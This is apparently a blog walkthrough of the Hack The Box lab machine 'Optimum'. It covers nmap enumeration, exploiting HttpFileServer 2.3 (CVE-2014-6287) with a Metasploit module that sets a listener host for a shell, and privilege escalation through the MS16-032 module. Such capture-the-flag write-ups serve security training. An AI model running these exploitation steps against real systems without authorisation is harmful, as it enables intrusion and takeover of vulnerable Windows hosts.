I"„
<ul>
  <li>Box: Optimum
    <ul>
      <li>Difficulty: Easy</li>
      <li>Points: 20</li>
      <li>Release: 18 Mar 2017</li>
      <li>IP: 10.10.10.8</li>
    </ul>
  </li>
</ul>

<p>###Initial Enumeration</p>

<p>####1. Nmap Scanning</p>

<p>Starting with a scan of the target ip address:</p>

<p><code class="highlighter-rouge">nmap -sC -sV -oA optimum.nmap 10.10.10.8</code></p>

<p>The nmap scan shows only port 80 is open and the detected software is an outdated HttpFileServer 2.3.</p>

<p><img src="/images/posts/htb/optimum/optimum1.jpg" /></p>

<p>Accessing the webpage, we see it looks to be a file server used to access/archive files over the network. Let‚Äôs look more into the HttpFileServer 2.3 version and investigate possible exploits.</p>

<p>The first serach reveals that this particular version has a remote command execution vulnerability
(CVE-2014-6287). Which conveniently, has a metasploit module available.</p>

<p><a href="https://www.exploit-db.com/exploits/39161">CVE-2014-6287</a></p>

<p>###Exploitation</p>

<p>####2. Metasploit Module</p>

<p>Load up metasploit and simply load up the exploit for this CVE:</p>

<p><code class="highlighter-rouge">use exploit/windows/http/rejetto_hfs_exec</code><br />
<code class="highlighter-rouge">set RHOSTS 10.10.10.8</code><br />
<code class="highlighter-rouge">set LHOSTS 10.10.14.9</code><br />
<code class="highlighter-rouge">run</code><br /></p>

<p>A shell will appear and you can find the user flag in the Desktop directory of the user ‚Äúkostas‚Äù.
The file will be named ‚Äú<strong>user.txt.txt</strong>‚Äù</p>

<p><img src="/images/posts/htb/optimum/optimum2.jpg" /></p>

<p><img src="/images/posts/htb/optimum/optimum3.jpg" /></p>

<p>###Privilege Escalation</p>

<p>Now we have to get the root flag. Since we have a meterpreter session open, we can use local_exploit_suggester and look for possible vulnerabilities.</p>

<p>Simply run:</p>

<p><code class="highlighter-rouge">use post/multi/recon/local_exploit_suggester</code> <br />
<code class="highlighter-rouge">set SESSION 1</code><br />
<code class="highlighter-rouge">run</code><br /></p>

<p><img src="/images/posts/htb/optimum/optimum4.jpg" /></p>

<p>We see 2 possible vulnerabilities. Trying the first doesn‚Äôt work but this is because we are not in the admins group.
Trying the next one, logon_handle works for us.</p>

<p><code class="highlighter-rouge">use windows/local/ms16_032_secondary_logon_handle_privesc</code><br />
<code class="highlighter-rouge">set SESSION 1</code><br />
<code class="highlighter-rouge">run</code><br /></p>

<p><img src="/images/posts/htb/optimum/optimum5.jpg" /></p>

<p>The root flag is found at ‚ÄúC:\Users\Administrator\Desktop\root.txt‚Äù</p>

<p><img src="/images/posts/htb/optimum/optimum6.jpg" /></p>
:ET